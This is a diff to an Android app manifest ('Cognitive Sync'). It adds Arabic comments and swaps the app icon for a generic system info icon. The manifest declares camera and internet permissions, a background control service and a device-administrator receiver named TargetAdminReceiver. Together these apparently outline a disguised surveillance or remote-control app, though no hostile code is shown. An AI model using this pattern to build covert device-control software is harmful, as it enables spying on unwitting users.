@@ -1,6 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
+    <!-- الأذونات الأمنية والتشغيلية -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.CAMERA" />
@@ -20,12 +21,13 @@
 
     <application
         android:allowBackup="true"
-        android:icon="@mipmap/ic_launcher"
+        android:icon="@android:drawable/ic_menu_info_details"
         android:label="Cognitive Sync"
-        android:roundIcon="@mipmap/ic_launcher_round"
+        android:roundIcon="@android:drawable/ic_menu_info_details"
         android:supportsRtl="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
 
+        <!-- النشاط الرئيسي -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
@@ -35,11 +37,13 @@
             </intent-filter>
         </activity>
 
+        <!-- خدمة التحكم في الخلفية -->
         <service
             android:name=".BackgroundControlService"
             android:enabled="true"
             android:exported="false" />
 
+        <!-- مستقبل إدارة الجهاز (Device Administrator) -->
         <receiver
             android:name=".TargetAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
